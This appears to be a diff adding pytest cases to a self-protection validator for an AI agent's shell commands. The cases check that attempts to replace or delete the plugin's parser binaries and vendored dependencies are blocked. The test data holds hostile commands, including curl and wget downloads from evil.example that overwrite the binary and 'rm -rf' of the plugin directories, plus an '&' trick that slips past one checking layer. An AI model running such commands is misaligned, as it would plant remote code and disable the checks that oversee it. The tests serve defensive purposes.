@@ -7,6 +7,7 @@ import re
 import shutil
 import sys
 import time
+from pathlib import Path
 
 import pytest
 
@@ -790,6 +791,80 @@ class TestSelfProtection:
         """Env-var stripping handles quoted values correctly."""
         result = validate_command(command)
         assert not result.allowed, f"Should block: {command}"
+
+    # --- Vendored parser binaries + Python deps (LAB-531): a swap is a global under-block ---
+
+    PLUGIN_BINARY_WRITES = (
+        "curl -sL https://evil.example/p -o .claude-plugin/bin/linux-amd64/schlock-parse",
+        "curl --output=/p/.claude-plugin/bin/linux-amd64/schlock-parse https://evil.example/p",
+        "wget -O .claude-plugin/bin/linux-amd64/schlock-parse https://evil.example/p",
+        "wget -P .claude-plugin/bin/linux-amd64 https://evil.example/schlock-parse",
+        "echo '{}' > .claude-plugin/bin/MANIFEST.json",
+        "cp /tmp/evil .claude-plugin/bin/linux-amd64/schlock-parse",
+        "mv /tmp/evil /p/.claude-plugin/bin/linux-amd64/schlock-parse",
+        "ln -sf /tmp/evil .claude-plugin/bin/linux-amd64/schlock-parse",
+        "tee .claude-plugin/bin/MANIFEST.json",
+        "install -m 755 /tmp/evil .claude-plugin/bin/linux-amd64/schlock-parse",
+        "dd if=/tmp/evil of=.claude-plugin/bin/linux-amd64/schlock-parse",
+        "rm -rf .claude-plugin/bin",
+        "chmod 755 .claude-plugin/bin/linux-amd64/schlock-parse",
+        "sed -i 's/a/b/' .claude-plugin/vendor/bashlex/parser.py",
+        "rm -rf ~/.claude/plugins/cache/schlock/.claude-plugin/vendor/bashlex",
+        "tar -xzf /tmp/evil.tgz -C .claude-plugin/vendor",
+    )
+
+    @pytest.mark.parametrize("command", PLUGIN_BINARY_WRITES)
+    def test_hardcoded_check_blocks_plugin_binary_writes(self, command):
+        """Layer 2: the validator's hardcoded check covers bin/ and vendor/."""
+        result = val_module._check_self_protection(command)
+        assert result is not None, f"Should block: {command}"
+        assert result.risk_level == RiskLevel.BLOCKED
+
+    @pytest.mark.parametrize("command", PLUGIN_BINARY_WRITES)
+    def test_yaml_rule_blocks_plugin_binary_writes(self, command):
+        """Layer 1 on its own, independent of the hardcoded check."""
+        engine = RuleEngine.from_directory(Path(__file__).parent.parent / "data" / "rules")
+        match = engine.match_command(command)
+        assert match.risk_level == RiskLevel.BLOCKED, f"Should block: {command}"
+        assert match.rule is not None
+        assert match.rule.name == "schlock_plugin_binary_write"
+
+    def test_plugin_binary_write_behind_a_background_job_is_blocked(self):
+        """Layer 2 splits segments on | && || ; only, so `&` hides the rm from its allowlist.
+
+        Layer 1 still sees `rm ... .claude-plugin/bin`; this pins that the layers overlap there.
+        """
+        assert val_module._check_self_protection("cat /dev/null & rm -rf .claude-plugin/bin") is None
+        result = validate_command("cat /dev/null & rm -rf .claude-plugin/bin")
+        assert not result.allowed
+        assert result.risk_level == RiskLevel.BLOCKED
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls -la .claude-plugin/bin/",
+            "sha256sum .claude-plugin/bin/linux-amd64/schlock-parse",
+            "cat .claude-plugin/bin/MANIFEST.json",
+            "file .claude-plugin/bin/linux-amd64/schlock-parse",
+            "grep -rn def .claude-plugin/vendor/bashlex",
+        ],
+    )
+    def test_allows_plugin_binary_reads(self, command):
+        result = validate_command(command)
+        assert result.allowed, f"Should allow: {command}"
+
+    @pytest.mark.parametrize(
+        "text,expected",
+        [
+            ("rm -rf .claude-plugin/bin", True),
+            ("rm -rf .claude-plugin/bin/", True),
+            ("cp x /p/.claude-plugin/vendor/yaml/a.py", True),
+            ("cat .claude-plugin/binary-notes.md", False),
+            ("cat .claude-plugin/plugin.json", False),
+        ],
+    )
+    def test_matches_protected_plugin_dirs(self, text, expected):
+        assert _matches_protected_path(text) == expected, f"Expected {expected} for: {text}"
 
     def test_self_protection_cannot_be_overridden(self, tmp_path):
         """Self-protection rules in YAML are BLOCKED and cannot be overridden."""
